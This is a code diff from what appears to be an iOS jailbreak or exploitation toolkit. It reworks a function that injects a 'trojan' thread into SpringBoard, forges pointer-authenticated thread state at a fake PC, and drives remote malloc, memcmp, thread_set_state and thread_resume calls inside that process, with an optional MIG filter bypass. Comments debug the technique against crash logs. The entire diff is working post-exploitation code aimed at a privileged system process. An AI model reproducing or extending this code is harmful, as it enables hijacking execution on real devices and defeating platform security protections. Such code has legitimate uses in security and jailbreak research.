@@ -2072,27 +2072,27 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     bool createdSuspended = false;
 
     if (!ios26StubPthread) {
-        // Immediate create after getpid (Cyanide). Never unsigned sleep.
-        // Log 16:48: pac_0x301 start + bounce read always canary, then MINHDUC+SB
-        // IPS. Two fixes:
-        // 1) start = remote_pac(strip(local getpid), 0) — accepted by libpthread
-        //    on 17.5.1 (sb-pac-sleep-pthread); pac_0x301 alone crashed SB.
-        // 2) bounce read: do NOT remote_write canary before memcpy — that
-        //    poisons VMShmem so remote_read64 returns our canary (false miss).
-        void *localGetpid = dlsym(RTLD_DEFAULT, "getpid");
-        uint64_t startRoutine = 0;
-        const char *startKind = "none";
-        if (localGetpid) {
-            startRoutine = remote_pac(g_RC_trojanThreadAddr,
-                                      native_strip((uint64_t)localGetpid), 0);
-            if (startRoutine && startRoutine != (uint64_t)-1)
-                startKind = "local_getpid_pac";
-            else
-                startRoutine = 0;
-        }
-        if (!startRoutine) {
-            startRoutine = remoteCrashSigned;
-            startKind = "pac_0x301";
+        // Park the synthetic thread by making FAKE_PC the *start routine*, the
+        // way Cyanide and Fl0rk do it. The thread is created suspended, so the
+        // kernel itself records PC=0x301 as creation-time state; the first thing
+        // the thread does after thread_resume is fault at 0x301, which lands in
+        // secondExceptionPort. Nothing written afterwards can perturb that.
+        //
+        // The fork instead used startRoutine = signed local getpid and then
+        // overwrote the state with thread_set_state(). That park never took:
+        // SB IPS 2026-09-26 06:21:04 shows thread_set_state returning kr=0 while
+        // the resumed thread still ran getpid with sp=0 — neither the 0x301 PC
+        // nor the borrowed SP landed, and the call thread then answered with an
+        // all-zero state that we used to reply onto (SIGKILL, CODESIGNING
+        // "Invalid Page"). Parking in creation-time state removes every
+        // unproven step: the remote_write into SB heap, the malloc/free of the
+        // state buffer, and the ARM_THREAD_STATE64 count semantics.
+        uint64_t startRoutine = remoteCrashSigned;
+        const char *startKind = "pac_0x301";
+        if (!startRoutine || startRoutine == (uint64_t)-1) {
+            RC_DIAG("remote_pac(FAKE_PC_TROJAN) failed — cannot create call thread");
+            fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+            return -1;
         }
 
         NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
@@ -2232,85 +2232,15 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     if(useMigFilterBypass)
         mig_bypass_pause();
 
-    (void)createdSuspended;
-    if (callThreadPort) {
-        // Suspended create/reuse with a usable port — park via thread_set_state.
-        arm_thread_state64_internal park = {0};
-        park.__sp = g_RC_originalState.__sp;
-        park.__fp = g_RC_originalState.__fp;
-        park.__flags = g_RC_originalState.__flags;
-
-        uint64_t stateBuf = do_remote_call_temp(100, "malloc",
-                                                sizeof(arm_thread_state64_internal),
-                                                0, 0, 0, 0, 0, 0, 0);
-        stateBuf = native_strip(stateBuf);
-        if (!g_RC_success || !stateBuf) {
-            RC_DIAG("malloc stateBuf for 0x301 park failed");
-            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-            return -1;
-        }
-        sign_state(g_RC_trojanThreadAddr, &park, FAKE_PC_TROJAN, FAKE_LR_TROJAN);
-        remote_write(stateBuf, &park, sizeof(park));
-
-        // Verify the park bytes actually reached SpringBoard's heap. The log at
-        // 2026-09-26 06:19:13 showed thread_set_state return kr=0 yet the resumed
-        // thread never trapped at 0x301 (next call saw a zeroed state), which
-        // means the kernel read a buffer that did not hold our signed 0x301.
-        // remote_read is known-poisoned on this path, so let SpringBoard compare
-        // its OWN memory: write a second copy and remote-memcmp it.
-        uint64_t expectBuf = do_remote_call_temp(100, "malloc",
-                                                 sizeof(arm_thread_state64_internal),
-                                                 0, 0, 0, 0, 0, 0, 0);
-        expectBuf = native_strip(expectBuf);
-        if (!g_RC_success || !expectBuf) {
-            RC_DIAG("park verify: expectBuf malloc failed — skipping check");
-        } else {
-            remote_write(expectBuf, &park, sizeof(park));
-            clear_remote_shmem_cache();
-            uint64_t diff = do_remote_call_temp(100, "memcmp",
-                                                stateBuf, expectBuf,
-                                                sizeof(arm_thread_state64_internal),
-                                                0, 0, 0, 0, 0);
-            if (!g_RC_success || diff != 0) {
-                RC_DIAG("park verify FAILED: remote_write did not land (sb memcmp diff=%llu) "
-                        "— refusing to resume synthetic thread",
-                        (unsigned long long)diff);
-                do_remote_call_temp(100, "free", expectBuf, 0, 0, 0, 0, 0, 0, 0);
-                do_remote_call_temp(100, "free", stateBuf, 0, 0, 0, 0, 0, 0, 0);
-                fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-                return -1;
-            }
-            RC_DIAG("park verify OK: signed 0x301/0x401 confirmed in SB heap");
-            do_remote_call_temp(100, "free", expectBuf, 0, 0, 0, 0, 0, 0, 0);
-        }
-
-        uint16_t options = 0;
-        if (g_RC_callThreadAddr) {
-            options = thread_get_options(g_RC_callThreadAddr);
-            thread_set_options(g_RC_callThreadAddr, (uint16_t)(options | TH_IN_MACH_EXCEPTION));
-        }
-
-        uint64_t setKr = do_remote_call_temp(100, "thread_set_state",
-                                             callThreadPort,
-                                             ARM_THREAD_STATE64,
-                                             stateBuf,
-                                             ARM_THREAD_STATE64_COUNT,
-                                             0, 0, 0, 0);
-
-        if (g_RC_callThreadAddr) {
-            thread_set_options(g_RC_callThreadAddr, options);
-        }
-
-        RC_DIAG("park synthetic 0x301 via thread_set_state kr=%llu pac301=0x%llx",
-                (unsigned long long)setKr, (unsigned long long)remoteCrashSigned);
-        do_remote_call_temp(100, "free", stateBuf, 0, 0, 0, 0, 0, 0, 0);
-        if (!g_RC_success || setKr != 0) {
-            RC_DIAG("thread_set_state park failed");
-            fail_after_creator_park(RemoteCallInitFailureCallThread, targetPid);
-            return -1;
-        }
-
-        RC_DEBUG("[%s:%d] All good! Resuming trojan thread...\n", __FUNCTION__, __LINE__);
+    if (callThreadPort && createdSuspended) {
+        // Fresh suspended pthread whose creation-time PC is signed 0x301.
+        // There is deliberately no thread_set_state park here: releasing the
+        // thread IS the park. The removed block set state via remote_write into
+        // SB heap + a remote thread_set_state, and that never took --
+        // thread_set_state returned kr=0 while the resumed thread still ran the
+        // start routine with sp=0 (SB IPS 2026-09-26 06:21:04).
+        RC_DIAG("resuming synthetic call thread (creation-time PC=0x%llx)",
+                (unsigned long long)remoteCrashSigned);
         uint64_t ret = do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
         if (ret != 0) {
             RC_DIAG("thread_resume synthetic failed ret=%llu (no originalThreadOnly fallback)",
@@ -2319,9 +2249,18 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             return -1;
         }
     } else {
-        // No SB port for thread[1]. GUARD AST does not deliver on this thread
-        // (log: wait timed out) — park via TRO-swap thread_set_state instead
-        // (same mechanism as set_exception_port_on_thread). Never originalThreadOnly.
+        // Either no SB port at all, or the port came from reusing thread[1] (iOS
+        // 26 path, where no fresh pthread was created). Neither has a
+        // creation-time PC of 0x301, so both need an explicit park via TRO-swap
+        // thread_set_state (same mechanism as set_exception_port_on_thread).
+        // Never originalThreadOnly.
+        if (callThreadPort) {
+            // The reuse path above already took a suspend on this thread via its
+            // SB port. park_remote_thread_via_tro_swap does its own balanced
+            // suspend/set_state/resume, so drop that extra suspend first --
+            // otherwise the thread stays suspended forever.
+            do_remote_call_temp(100, "thread_resume", callThreadPort, 0, 0, 0, 0, 0, 0, 0);
+        }
         arm_thread_state64_internal park = {0};
         park.__sp = g_RC_originalState.__sp;
         park.__fp = g_RC_originalState.__fp;
